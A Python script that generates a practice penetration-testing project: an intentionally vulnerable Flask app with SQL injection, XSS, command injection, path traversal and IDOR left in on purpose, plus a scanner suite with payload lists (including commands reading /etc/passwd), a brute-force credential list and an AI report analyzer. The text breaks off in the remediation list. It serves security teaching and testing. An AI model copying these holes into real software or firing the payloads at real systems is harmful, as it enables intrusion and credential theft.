#!/usr/bin/env python3
"""
Automated Penetration Testing Project - Bootstrap Script
Run this script ONCE to generate the full project structure.
Usage: python create_project.py
"""
import os
import textwrap

BASE = os.path.dirname(os.path.abspath(__file__))

FILES = {}

# ─────────────────────────────────────────────────────────────────────────────
# WEBAPP
# ─────────────────────────────────────────────────────────────────────────────

FILES["webapp/requirements.txt"] = """\
flask==3.0.3
flask-session==0.8.0
werkzeug==3.0.3
"""

FILES["webapp/Dockerfile"] = """\
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
ENV FLASK_APP=app.py
ENV FLASK_ENV=development
EXPOSE 5000
CMD ["python", "app.py"]
"""

FILES["webapp/database.py"] = '''\
"""SQLite database initializer with intentionally vulnerable seed data."""
import sqlite3, os

DB_PATH = os.environ.get("DB_PATH", "/tmp/webapp.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            role     TEXT DEFAULT \'user\',
            email    TEXT
        );
        CREATE TABLE IF NOT EXISTS comments (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            author  TEXT NOT NULL,
            body    TEXT NOT NULL,
            created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        INSERT OR IGNORE INTO users (username, password, role, email) VALUES
            (\'admin\',   \'admin123\',  \'admin\', \'admin@corp.local\'),
            (\'alice\',   \'password1\', \'user\',  \'alice@corp.local\'),
            (\'bob\',     \'bob1234\',   \'user\',  \'bob@corp.local\'),
            (\'charlie\', \'charlie99\', \'user\',  \'charlie@corp.local\');
        INSERT OR IGNORE INTO comments (author, body) VALUES
            (\'alice\', \'Hello everyone!\'),
            (\'bob\',   \'Great site!\');
    """)
    conn.commit()
    conn.close()
'''

FILES["webapp/app.py"] = '''\
"""
Intentionally Vulnerable Flask Web Application
WARNING: For educational/testing purposes ONLY. Never deploy to production.

Vulnerabilities included:
  - SQL Injection     (login, search)
  - Reflected XSS     (search)
  - Stored XSS        (comments)
  - IDOR              (user profile by id)
  - Command Injection (ping utility)
  - Path Traversal    (file viewer)
  - Weak Auth         (no lockout, plaintext passwords)
  - CSRF              (no tokens)
  - Info Disclosure   (verbose errors)
"""
import os, sqlite3, subprocess
from flask import (Flask, request, session, redirect, url_for,
                   render_template, jsonify, g)
from database import get_db, init_db

app = Flask(__name__)
app.secret_key = "supersecretkey123"   # weak secret key

# ── Helpers ───────────────────────────────────────────────────────────────────
@app.before_request
def open_db():
    g.db = get_db()

@app.teardown_appcontext
def close_db(error):
    db = g.pop("db", None)
    if db is not None:
        db.close()

# ── Home ──────────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html",
                           user=session.get("username"),
                           role=session.get("role"))

# ── Login  (SQL Injection vulnerable) ─────────────────────────────────────────
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        # VULNERABILITY: raw string interpolation → SQL Injection
        query = f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'"
        try:
            user = g.db.execute(query).fetchone()
        except Exception as e:
            # VULNERABILITY: verbose error leaks query structure
            return render_template("login.html", error=f"DB error: {e} | Query: {query}")
        if user:
            session["username"] = user["username"]
            session["role"]     = user["role"]
            session["user_id"]  = user["id"]
            return redirect(url_for("dashboard"))
        error = "Invalid credentials"
    return render_template("login.html", error=error)

# ── Logout ────────────────────────────────────────────────────────────────────
@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

# ── Dashboard ─────────────────────────────────────────────────────────────────
@app.route("/dashboard")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))
    users = g.db.execute("SELECT id, username, role FROM users").fetchall()
    return render_template("dashboard.html",
                           user=session["username"],
                           role=session["role"],
                           users=users)

# ── Search  (Reflected XSS + SQL Injection) ───────────────────────────────────
@app.route("/search")
def search():
    q = request.args.get("q", "")
    results = []
    if q:
        # VULNERABILITY: raw SQL interpolation
        try:
            results = g.db.execute(
                f"SELECT id, username, email FROM users WHERE username LIKE \'%{q}%\'"
            ).fetchall()
        except Exception as e:
            return render_template("search.html", q=q, results=[], error=str(e))
    # VULNERABILITY: q rendered unescaped in template → Reflected XSS
    return render_template("search.html", q=q, results=results)

# ── Profile  (IDOR – no auth check on user_id) ────────────────────────────────
@app.route("/profile/<int:user_id>")
def profile(user_id):
    # VULNERABILITY: no ownership check – any logged-in user can view any profile
    user = g.db.execute("SELECT * FROM users WHERE id=?", (user_id,)).fetchone()
    if not user:
        return "User not found", 404
    return render_template("profile.html", target=user,
                           current_user=session.get("username"))

# ── Comments  (Stored XSS) ────────────────────────────────────────────────────
@app.route("/comments", methods=["GET", "POST"])
def comments():
    if request.method == "POST":
        author = request.form.get("author", "anonymous")
        body   = request.form.get("body", "")
        # VULNERABILITY: body stored and rendered unescaped → Stored XSS
        g.db.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))
        g.db.commit()
        return redirect(url_for("comments"))
    rows = g.db.execute("SELECT * FROM comments ORDER BY created DESC").fetchall()
    return render_template("comments.html", comments=rows)

# ── Ping Utility  (Command Injection) ─────────────────────────────────────────
@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    output = ""
    if host:
        # VULNERABILITY: unsanitized user input passed to shell
        try:
            result = subprocess.run(
                f"ping -c 2 {host}",
                shell=True, capture_output=True, text=True, timeout=10
            )
            output = result.stdout + result.stderr
        except Exception as e:
            output = str(e)
    return render_template("ping.html", host=host, output=output)

# ── File Viewer  (Path Traversal) ─────────────────────────────────────────────
@app.route("/files")
def files():
    filename = request.args.get("file", "")
    content  = ""
    error    = ""
    if filename:
        # VULNERABILITY: no path canonicalization → path traversal
        safe_dir = "/app/static/"
        filepath = safe_dir + filename
        try:
            with open(filepath, "r") as f:
                content = f.read()
        except Exception as e:
            error = str(e)
    return render_template("files.html", filename=filename,
                           content=content, error=error)

# ── Admin Panel  (Role not enforced via middleware, just session key) ──────────
@app.route("/admin")
def admin():
    # VULNERABILITY: trivially bypassed by setting session["role"] = "admin"
    if session.get("role") != "admin":
        return "Access denied", 403
    users = g.db.execute("SELECT * FROM users").fetchall()
    return render_template("admin.html", users=users)

# ── API: user info (no auth) ──────────────────────────────────────────────────
@app.route("/api/user/<int:user_id>")
def api_user(user_id):
    # VULNERABILITY: unauthenticated endpoint leaks full user record
    user = g.db.execute("SELECT * FROM users WHERE id=?", (user_id,)).fetchone()
    if not user:
        return jsonify({"error": "not found"}), 404
    return jsonify(dict(user))   # exposes password field

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)
'''

FILES["webapp/templates/base.html"] = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>VulnApp - {% block title %}Home{% endblock %}</title>
  <style>
    body{font-family:Arial,sans-serif;margin:0;background:#f4f4f4}
    nav{background:#2c3e50;padding:10px 20px;color:#fff}
    nav a{color:#ecf0f1;text-decoration:none;margin-right:15px;font-weight:bold}
    nav a:hover{color:#3498db}
    .container{max-width:900px;margin:30px auto;background:#fff;padding:25px;border-radius:6px;box-shadow:0 2px 6px rgba(0,0,0,.1)}
    .alert{padding:10px;background:#e74c3c;color:#fff;border-radius:4px;margin-bottom:15px}
    input,textarea{width:100%;padding:8px;margin:6px 0 14px;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}
    button,input[type=submit]{width:auto;padding:9px 20px;background:#2980b9;color:#fff;border:none;border-radius:4px;cursor:pointer}
    button:hover,input[type=submit]:hover{background:#1a6fa0}
    table{width:100%;border-collapse:collapse}
    th,td{padding:10px;border:1px solid #ddd;text-align:left}
    th{background:#34495e;color:#fff}
    code{background:#ecf0f1;padding:2px 6px;border-radius:3px;font-size:.9em}
    pre{background:#2c3e50;color:#ecf0f1;padding:15px;border-radius:4px;overflow:auto}
  </style>
</head>
<body>
<nav>
  <a href="/">🏠 VulnApp</a>
  <a href="/dashboard">Dashboard</a>
  <a href="/search">Search</a>
  <a href="/comments">Comments</a>
  <a href="/ping">Ping</a>
  <a href="/files">Files</a>
  <a href="/admin">Admin</a>
  {% if session.username %}
    <span style="float:right">👤 {{ session.username }} | <a href="/logout">Logout</a></span>
  {% else %}
    <a href="/login" style="float:right">Login</a>
  {% endif %}
</nav>
<div class="container">
  {% block content %}{% endblock %}
</div>
</body>
</html>
"""

FILES["webapp/templates/index.html"] = """\
{% extends "base.html" %}
{% block title %}Home{% endblock %}
{% block content %}
<h1>Welcome to VulnApp</h1>
<p>An intentionally vulnerable web application for security testing.</p>
<table>
  <tr><th>Endpoint</th><th>Vulnerability</th></tr>
  <tr><td><a href="/login">/login</a></td><td>SQL Injection, Info Disclosure</td></tr>
  <tr><td><a href="/search">/search</a></td><td>Reflected XSS, SQL Injection</td></tr>
  <tr><td><a href="/comments">/comments</a></td><td>Stored XSS, CSRF</td></tr>
  <tr><td><a href="/profile/1">/profile/&lt;id&gt;</a></td><td>IDOR</td></tr>
  <tr><td><a href="/ping">/ping</a></td><td>Command Injection</td></tr>
  <tr><td><a href="/files">/files</a></td><td>Path Traversal</td></tr>
  <tr><td><a href="/api/user/1">/api/user/&lt;id&gt;</a></td><td>Unauthenticated API, Data Exposure</td></tr>
</table>
{% endblock %}
"""

FILES["webapp/templates/login.html"] = """\
{% extends "base.html" %}
{% block title %}Login{% endblock %}
{% block content %}
<h2>Login</h2>
{% if error %}<div class="alert">{{ error }}</div>{% endif %}
<form method="POST">
  <label>Username</label>
  <input type="text" name="username" placeholder="try: admin' --">
  <label>Password</label>
  <input type="password" name="password">
  <input type="submit" value="Login">
</form>
<p><small>Hint: try <code>admin' --</code> as username</small></p>
{% endblock %}
"""

FILES["webapp/templates/dashboard.html"] = """\
{% extends "base.html" %}
{% block title %}Dashboard{% endblock %}
{% block content %}
<h2>Dashboard</h2>
<p>Logged in as <strong>{{ user }}</strong> (role: {{ role }})</p>
<h3>All Users (IDOR demo)</h3>
<table>
  <tr><th>ID</th><th>Username</th><th>Role</th><th>Action</th></tr>
  {% for u in users %}
  <tr>
    <td>{{ u.id }}</td>
    <td>{{ u.username }}</td>
    <td>{{ u.role }}</td>
    <td><a href="/profile/{{ u.id }}">View Profile</a></td>
  </tr>
  {% endfor %}
</table>
{% endblock %}
"""

FILES["webapp/templates/search.html"] = """\
{% extends "base.html" %}
{% block title %}Search{% endblock %}
{% block content %}
<h2>User Search</h2>
<form method="GET">
  <input type="text" name="q" value="{{ q }}" placeholder="Search username...">
  <input type="submit" value="Search">
</form>
{% if error %}<div class="alert">{{ error }}</div>{% endif %}
{% if q %}
<!-- VULNERABILITY: q rendered raw (unescaped) → Reflected XSS -->
<p>Results for: <b>{{ q | safe }}</b></p>
{% endif %}
{% if results %}
<table>
  <tr><th>ID</th><th>Username</th><th>Email</th></tr>
  {% for r in results %}
  <tr><td>{{ r.id }}</td><td>{{ r.username }}</td><td>{{ r.email }}</td></tr>
  {% endfor %}
</table>
{% endif %}
{% endblock %}
"""

FILES["webapp/templates/profile.html"] = """\
{% extends "base.html" %}
{% block title %}Profile{% endblock %}
{% block content %}
<h2>User Profile</h2>
<!-- VULNERABILITY: exposes sensitive user data without ownership check (IDOR) -->
<table>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>ID</td><td>{{ target.id }}</td></tr>
  <tr><td>Username</td><td>{{ target.username }}</td></tr>
  <tr><td>Email</td><td>{{ target.email }}</td></tr>
  <tr><td>Role</td><td>{{ target.role }}</td></tr>
  <tr><td>Password (exposed!)</td><td>{{ target.password }}</td></tr>
</table>
<p><a href="/dashboard">← Back</a></p>
{% endblock %}
"""

FILES["webapp/templates/comments.html"] = """\
{% extends "base.html" %}
{% block title %}Comments{% endblock %}
{% block content %}
<h2>Comments</h2>
<!-- VULNERABILITY: no CSRF token on form -->
<form method="POST">
  <label>Your name</label>
  <input type="text" name="author" value="">
  <label>Comment</label>
  <textarea name="body" rows="3" placeholder="Try: <script>alert(1)</script>"></textarea>
  <input type="submit" value="Post">
</form>
<hr>
{% for c in comments %}
<div style="border-bottom:1px solid #eee;margin:10px 0;padding:10px">
  <strong>{{ c.author }}</strong> <small>{{ c.created }}</small>
  <!-- VULNERABILITY: body rendered unescaped → Stored XSS -->
  <p>{{ c.body | safe }}</p>
</div>
{% endfor %}
{% endblock %}
"""

FILES["webapp/templates/ping.html"] = """\
{% extends "base.html" %}
{% block title %}Ping{% endblock %}
{% block content %}
<h2>Ping Utility</h2>
<!-- VULNERABILITY: no sanitization → Command Injection -->
<form method="GET">
  <input type="text" name="host" value="{{ host }}" placeholder="e.g. 127.0.0.1; id">
  <input type="submit" value="Ping">
</form>
{% if output %}
<h3>Output:</h3>
<pre>{{ output }}</pre>
{% endif %}
<p><small>Hint: try <code>127.0.0.1; id</code></small></p>
{% endblock %}
"""

FILES["webapp/templates/files.html"] = """\
{% extends "base.html" %}
{% block title %}File Viewer{% endblock %}
{% block content %}
<h2>File Viewer</h2>
<!-- VULNERABILITY: path traversal, no canonicalization -->
<form method="GET">
  <input type="text" name="file" value="{{ filename }}" placeholder="e.g. ../../etc/passwd">
  <input type="submit" value="Read">
</form>
{% if error %}<div class="alert">{{ error }}</div>{% endif %}
{% if content %}
<h3>Contents of: {{ filename }}</h3>
<pre>{{ content }}</pre>
{% endif %}
{% endblock %}
"""

FILES["webapp/templates/admin.html"] = """\
{% extends "base.html" %}
{% block title %}Admin{% endblock %}
{% block content %}
<h2>Admin Panel</h2>
<table>
  <tr><th>ID</th><th>Username</th><th>Password</th><th>Role</th><th>Email</th></tr>
  {% for u in users %}
  <tr>
    <td>{{ u.id }}</td>
    <td>{{ u.username }}</td>
    <td>{{ u.password }}</td>
    <td>{{ u.role }}</td>
    <td>{{ u.email }}</td>
  </tr>
  {% endfor %}
</table>
{% endblock %}
"""

# ─────────────────────────────────────────────────────────────────────────────
# PENTESTER
# ─────────────────────────────────────────────────────────────────────────────

FILES["pentester/requirements.txt"] = """\
requests==2.31.0
beautifulsoup4==4.12.3
openai==1.35.7
python-dotenv==1.0.1
colorama==0.4.6
jinja2==3.1.4
"""

FILES["pentester/Dockerfile"] = """\
FROM python:3.11-slim
WORKDIR /pentest
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
CMD ["python", "main.py"]
"""

FILES["pentester/.env.example"] = """\
# Copy to .env and fill in your values
TARGET_URL=http://webapp:5000
OPENAI_API_KEY=sk-your-key-here
OPENAI_MODEL=gpt-4o-mini
REPORT_DIR=/reports
"""

FILES["pentester/config.py"] = '''\
"""Centralised configuration loaded from environment / .env file."""
import os
from dotenv import load_dotenv

load_dotenv()

TARGET_URL   = os.getenv("TARGET_URL",   "http://localhost:5000")
OPENAI_KEY   = os.getenv("OPENAI_API_KEY", "")
OPENAI_MODEL = os.getenv("OPENAI_MODEL",   "gpt-4o-mini")
REPORT_DIR   = os.getenv("REPORT_DIR",     "./reports")

# Default credential list for brute-force tests
DEFAULT_CREDS = [
    ("admin",   "admin"),
    ("admin",   "admin123"),
    ("admin",   "password"),
    ("alice",   "password1"),
    ("bob",     "bob1234"),
    ("root",    "root"),
    ("test",    "test"),
]

# SQL injection payloads
SQLI_PAYLOADS = [
    "\'",
    "\'--",
    "\'--+-",
    "\" OR \"1\"=\"1",
    "\' OR \'1\'=\'1\'--",
    "\' OR 1=1--",
    "admin\'--",
    "1\' ORDER BY 1--",
    "1\' UNION SELECT null--",
    "1\' AND SLEEP(5)--",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(\'XSS\')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\'><script>alert(document.cookie)</script>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<<SCRIPT>alert(\'XSS\');//<</SCRIPT>",
]

# Path traversal payloads
TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "../../proc/self/environ",
    "../../windows/win.ini",
    "../../boot.ini",
]

# Command injection payloads
CMD_PAYLOADS = [
    "127.0.0.1; id",
    "127.0.0.1 && id",
    "127.0.0.1 | id",
    "127.0.0.1; whoami",
    "127.0.0.1; cat /etc/passwd",
    "; ls -la",
    "| cat /etc/passwd",
    "`id`",
    "$(id)",
]
'''

FILES["pentester/scanners/__init__.py"] = """\
from .sql_injection   import SQLInjectionScanner
from .xss_scanner     import XSSScanner
from .auth_tester     import AuthTester
from .dir_traversal   import DirTraversalScanner
from .command_injection import CommandInjectionScanner
from .idor_scanner    import IDORScanner

__all__ = [
    "SQLInjectionScanner",
    "XSSScanner",
    "AuthTester",
    "DirTraversalScanner",
    "CommandInjectionScanner",
    "IDORScanner",
]
"""

FILES["pentester/scanners/sql_injection.py"] = '''\
"""SQL Injection scanner."""
import requests
from config import TARGET_URL, SQLI_PAYLOADS


class SQLInjectionScanner:
    NAME = "SQL Injection"

    def __init__(self):
        self.session = requests.Session()
        self.findings = []

    def _record(self, endpoint, payload, evidence, severity="HIGH"):
        self.findings.append({
            "type":     self.NAME,
            "endpoint": endpoint,
            "payload":  payload,
            "evidence": evidence,
            "severity": severity,
        })

    def test_login(self):
        url = f"{TARGET_URL}/login"
        for payload in SQLI_PAYLOADS:
            try:
                r = self.session.post(url,
                    data={"username": payload, "password": "anything"},
                    allow_redirects=True, timeout=10)
                # Successful redirect to /dashboard means bypass worked
                if "/dashboard" in r.url or "Welcome" in r.text or "Dashboard" in r.text:
                    self._record(url, payload,
                                 f"Login bypassed: redirected to {r.url}")
                # Error-based: DB errors leak query structure
                if "DB error" in r.text or "sqlite" in r.text.lower():
                    self._record(url, payload,
                                 "Verbose DB error in response", severity="MEDIUM")
            except requests.RequestException as e:
                pass

    def test_search(self):
        url = f"{TARGET_URL}/search"
        for payload in SQLI_PAYLOADS:
            try:
                r = self.session.get(url, params={"q": payload}, timeout=10)
                if any(kw in r.text.lower() for kw in
                       ["sqlite", "syntax error", "db error", "operational error"]):
                    self._record(url, payload,
                                 "SQLite error message in search response", severity="HIGH")
            except requests.RequestException:
                pass

    def run(self):
        print("  [SQLi] Testing login endpoint...")
        self.test_login()
        print("  [SQLi] Testing search endpoint...")
        self.test_search()
        print(f"  [SQLi] Found {len(self.findings)} issue(s)")
        return self.findings
'''

FILES["pentester/scanners/xss_scanner.py"] = '''\
"""XSS scanner – reflected and stored."""
import requests
from bs4 import BeautifulSoup
from config import TARGET_URL, XSS_PAYLOADS


class XSSScanner:
    NAME = "Cross-Site Scripting (XSS)"

    def __init__(self):
        self.session = requests.Session()
        self.findings = []

    def _record(self, endpoint, payload, xss_type, evidence="Payload reflected unescaped"):
        self.findings.append({
            "type":     f"{self.NAME} ({xss_type})",
            "endpoint": endpoint,
            "payload":  payload,
            "evidence": evidence,
            "severity": "HIGH",
        })

    def test_reflected(self):
        url = f"{TARGET_URL}/search"
        for payload in XSS_PAYLOADS:
            try:
                r = self.session.get(url, params={"q": payload}, timeout=10)
                if payload in r.text:
                    self._record(url, payload, "Reflected",
                                 "Exact payload present in HTML response")
            except requests.RequestException:
                pass

    def test_stored(self):
        url = f"{TARGET_URL}/comments"
        for payload in XSS_PAYLOADS[:4]:   # limit stored writes
            try:
                self.session.post(url,
                    data={"author": "pentester", "body": payload},
                    timeout=10)
                r = self.session.get(url, timeout=10)
                if payload in r.text:
                    self._record(url, payload, "Stored",
                                 "Payload persisted and returned in page HTML")
            except requests.RequestException:
                pass

    def run(self):
        print("  [XSS] Testing reflected XSS...")
        self.test_reflected()
        print("  [XSS] Testing stored XSS...")
        self.test_stored()
        print(f"  [XSS] Found {len(self.findings)} issue(s)")
        return self.findings
'''

FILES["pentester/scanners/auth_tester.py"] = '''\
"""Authentication tester – brute force and session checks."""
import requests
from config import TARGET_URL, DEFAULT_CREDS


class AuthTester:
    NAME = "Authentication"

    def __init__(self):
        self.session = requests.Session()
        self.findings = []
        self.valid_creds = []

    def _record(self, endpoint, detail, severity="HIGH"):
        self.findings.append({
            "type":     self.NAME,
            "endpoint": endpoint,
            "payload":  detail,
            "evidence": detail,
            "severity": severity,
        })

    def test_brute_force(self):
        url = f"{TARGET_URL}/login"
        # No lockout check — server accepts unlimited attempts
        hit_count = 0
        for username, password in DEFAULT_CREDS:
            try:
                s = requests.Session()
                r = s.post(url,
                    data={"username": username, "password": password},
                    allow_redirects=True, timeout=10)
                if "/dashboard" in r.url or "Dashboard" in r.text:
                    hit_count += 1
                    self.valid_creds.append((username, password))
                    self._record(url,
                        f"Valid credentials found: {username}/{password}")
            except requests.RequestException:
                pass
        if hit_count > 1:
            self._record(url,
                "No account lockout – brute force succeeded with multiple accounts",
                severity="MEDIUM")

    def test_session_fixation(self):
        url = f"{TARGET_URL}/login"
        try:
            # Get a pre-auth session cookie
            s = requests.Session()
            s.get(f"{TARGET_URL}/", timeout=10)
            pre_cookies = dict(s.cookies)
            s.post(url, data={"username": "admin", "password": "admin123"},
                   allow_redirects=True, timeout=10)
            post_cookies = dict(s.cookies)
            if pre_cookies == post_cookies and pre_cookies:
                self._record(url,
                    "Session cookie unchanged after login – possible session fixation",
                    severity="MEDIUM")
        except requests.RequestException:
            pass

    def test_weak_session_secret(self):
        # Check if Flask debug mode is on (reveals secret key risk)
        try:
            r = requests.get(f"{TARGET_URL}/nonexistent-page-abc", timeout=10)
            if "werkzeug" in r.text.lower() or "debugger" in r.text.lower():
                self._record(f"{TARGET_URL}/",
                    "Flask debug mode active – secret key and source code exposed",
                    severity="CRITICAL")
        except requests.RequestException:
            pass

    def run(self):
        print("  [Auth] Brute-forcing credentials...")
        self.test_brute_force()
        print("  [Auth] Checking session fixation...")
        self.test_session_fixation()
        print("  [Auth] Checking debug mode / weak secrets...")
        self.test_weak_session_secret()
        print(f"  [Auth] Found {len(self.findings)} issue(s)")
        return self.findings
'''

FILES["pentester/scanners/dir_traversal.py"] = '''\
"""Directory / path traversal scanner."""
import requests
from config import TARGET_URL, TRAVERSAL_PAYLOADS


UNIX_INDICATORS = ["root:x:", "root:0:0", "[boot loader]", "[extensions]",
                   "daemon:", "bin/bash", "environ"]


class DirTraversalScanner:
    NAME = "Path Traversal"

    def __init__(self):
        self.session = requests.Session()
        self.findings = []

    def _record(self, endpoint, payload, evidence):
        self.findings.append({
            "type":     self.NAME,
            "endpoint": endpoint,
            "payload":  payload,
            "evidence": evidence,
            "severity": "HIGH",
        })

    def test_file_endpoint(self):
        url = f"{TARGET_URL}/files"
        for payload in TRAVERSAL_PAYLOADS:
            try:
                r = self.session.get(url, params={"file": payload}, timeout=10)
                for indicator in UNIX_INDICATORS:
                    if indicator in r.text:
                        self._record(url, payload,
                            f"Sensitive file content detected: '{indicator}'")
                        break
            except requests.RequestException:
                pass

    def run(self):
        print("  [Traversal] Testing file endpoint...")
        self.test_file_endpoint()
        print(f"  [Traversal] Found {len(self.findings)} issue(s)")
        return self.findings
'''

FILES["pentester/scanners/command_injection.py"] = '''\
"""Command injection scanner."""
import requests
from config import TARGET_URL, CMD_PAYLOADS


CMD_INDICATORS = ["uid=", "root", "/bin/sh", "/etc/passwd",
                  "total ", "drwx", "www-data"]


class CommandInjectionScanner:
    NAME = "Command Injection"

    def __init__(self):
        self.session = requests.Session()
        self.findings = []

    def _record(self, endpoint, payload, evidence):
        self.findings.append({
            "type":     self.NAME,
            "endpoint": endpoint,
            "payload":  payload,
            "evidence": evidence,
            "severity": "CRITICAL",
        })

    def test_ping_endpoint(self):
        url = f"{TARGET_URL}/ping"
        for payload in CMD_PAYLOADS:
            try:
                r = self.session.get(url, params={"host": payload}, timeout=15)
                for indicator in CMD_INDICATORS:
                    if indicator in r.text:
                        self._record(url, payload,
                            f"OS command output detected: '{indicator}'")
                        break
            except requests.RequestException:
                pass

    def run(self):
        print("  [CmdInj] Testing ping endpoint...")
        self.test_ping_endpoint()
        print(f"  [CmdInj] Found {len(self.findings)} issue(s)")
        return self.findings
'''

FILES["pentester/scanners/idor_scanner.py"] = '''\
"""IDOR (Insecure Direct Object Reference) scanner."""
import requests
from config import TARGET_URL, DEFAULT_CREDS


class IDORScanner:
    NAME = "IDOR / Broken Access Control"

    def __init__(self):
        self.session = requests.Session()
        self.findings = []

    def _record(self, endpoint, payload, evidence, severity="HIGH"):
        self.findings.append({
            "type":     self.NAME,
            "endpoint": endpoint,
            "payload":  payload,
            "evidence": evidence,
            "severity": severity,
        })

    def _login(self, username, password):
        s = requests.Session()
        s.post(f"{TARGET_URL}/login",
               data={"username": username, "password": password},
               allow_redirects=True, timeout=10)
        return s

    def test_profile_idor(self):
        # Login as alice (id=2) and try to read other profiles
        s = self._login("alice", "password1")
        for uid in range(1, 6):
            try:
                r = s.get(f"{TARGET_URL}/profile/{uid}", timeout=10)
                if r.status_code == 200 and "Password (exposed!)" in r.text:
                    self._record(f"{TARGET_URL}/profile/{uid}",
                        f"Accessed profile of user id={uid} as alice",
                        "Profile data returned without ownership check")
            except requests.RequestException:
                pass

    def test_api_idor(self):
        # Unauthenticated API leaks all user data
        for uid in range(1, 6):
            try:
                r = requests.get(f"{TARGET_URL}/api/user/{uid}", timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if "password" in data:
                        self._record(f"{TARGET_URL}/api/user/{uid}",
                            f"Unauthenticated access to user id={uid}",
                            f"Response includes password: {data.get('password','?')[:6]}...",
                            severity="CRITICAL")
            except (requests.RequestException, ValueError):
                pass

    def run(self):
        print("  [IDOR] Testing profile access control...")
        self.test_profile_idor()
        print("  [IDOR] Testing unauthenticated API...")
        self.test_api_idor()
        print(f"  [IDOR] Found {len(self.findings)} issue(s)")
        return self.findings
'''

FILES["pentester/ai_analyzer.py"] = '''\
"""
AI-powered vulnerability analyzer using OpenAI.
Accepts raw scan findings and returns:
  - Severity ratings (CVSS-style)
  - Attack narrative
  - Prioritised remediation steps
  - Executive summary
"""
import json
from config import OPENAI_KEY, OPENAI_MODEL


def analyze(findings: list[dict]) -> dict:
    """
    Send findings to OpenAI and return structured analysis.
    Falls back to rule-based summary if no API key is configured.
    """
    if not OPENAI_KEY or OPENAI_KEY.startswith("sk-your"):
        print("  [AI] No OpenAI key configured – using rule-based analysis.")
        return _rule_based_analysis(findings)

    try:
        from openai import OpenAI
        client = OpenAI(api_key=OPENAI_KEY)

        prompt = _build_prompt(findings)
        response = client.chat.completions.create(
            model=OPENAI_MODEL,
            messages=[
                {"role": "system",
                 "content": (
                     "You are a senior penetration tester and security consultant. "
                     "Analyse the provided vulnerability findings and respond ONLY with "
                     "valid JSON matching the schema described in the user message."
                 )},
                {"role": "user", "content": prompt},
            ],
            temperature=0.3,
            max_tokens=2000,
        )
        raw = response.choices[0].message.content.strip()
        # Strip markdown code fences if present
        if raw.startswith("```"):
            raw = raw.split("\\n", 1)[-1].rsplit("```", 1)[0]
        return json.loads(raw)

    except Exception as e:
        print(f"  [AI] OpenAI call failed: {e}. Using rule-based fallback.")
        return _rule_based_analysis(findings)


def _build_prompt(findings: list[dict]) -> str:
    findings_json = json.dumps(findings, indent=2)
    return f"""
Analyse the following web application penetration test findings.
Respond ONLY with a JSON object with this exact schema:

{{
  "executive_summary": "<2-3 sentence non-technical overview>",
  "risk_rating": "<Critical|High|Medium|Low>",
  "total_findings": <int>,
  "critical_count": <int>,
  "high_count": <int>,
  "medium_count": <int>,
  "low_count": <int>,
  "findings_analysis": [
    {{
      "type": "<vulnerability type>",
      "cvss_score": <float 0-10>,
      "cvss_vector": "<AV:N/AC:L/...>",
      "attack_scenario": "<realistic attack narrative>",
      "business_impact": "<business risk description>",
      "remediation": ["<step 1>", "<step 2>", ...]
    }}
  ],
  "top_priorities": ["<action 1>", "<action 2>", "<action 3>"],
  "positive_findings": ["<any security controls that are working>"]
}}

RAW FINDINGS:
{findings_json}
"""


def _rule_based_analysis(findings: list[dict]) -> dict:
    """Fallback analysis when OpenAI is unavailable."""
    severity_map = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for f in findings:
        sev = f.get("severity", "LOW").upper()
        counts[sev] = counts.get(sev, 0) + 1

    vuln_types = list({f["type"] for f in findings})
    risk = "Critical" if counts["CRITICAL"] > 0 else \\
           "High"     if counts["HIGH"] > 0     else \\
           "Medium"   if counts["MEDIUM"] > 0   else "Low"

    REMEDIATION_DB = {
        "SQL Injection": [
            "Use parameterised queries or prepared statements",
            "Apply input validation and allowlisting",
            "Use an ORM with built-in sanitisation",
            "Implement WAF rules for SQLi patterns",
        ],
        "Cross-Site Scripting (XSS)": [
            "HTML-encode all user-supplied output using a context-aware encoder",
            "Implement Content Security Policy (CSP) headers",
            "Use framework auto-escaping (never |safe filter with user data)",
            "Set HttpOnly and Secure flags on session cookies",
        ],
        "Authentication": [
            "Implement account lockout after 5 failed attempts",
            "Enforce strong password policy (min 12 chars, complexity)",
            "Use bcrypt/argon2 for password hashing — never store plaintext",
            "Regenerate session ID after successful login (prevent fixation)",
        ],
        "Path Traversal": [
            "Resolve canonical path and verify it starts with the allowed base directory",
            "Use a whitelist of permitted filenames",
            "Never pass user input directly to filesystem APIs",
        ],
        "Command Injection": [
            "Never pass user input to shell commands",
            "Use language-native APIs (e.g., socket libraries) instead of ping",
            "If shell is required, use allowlist validation on input",
        ],
        "IDOR / Broken Access Control": [
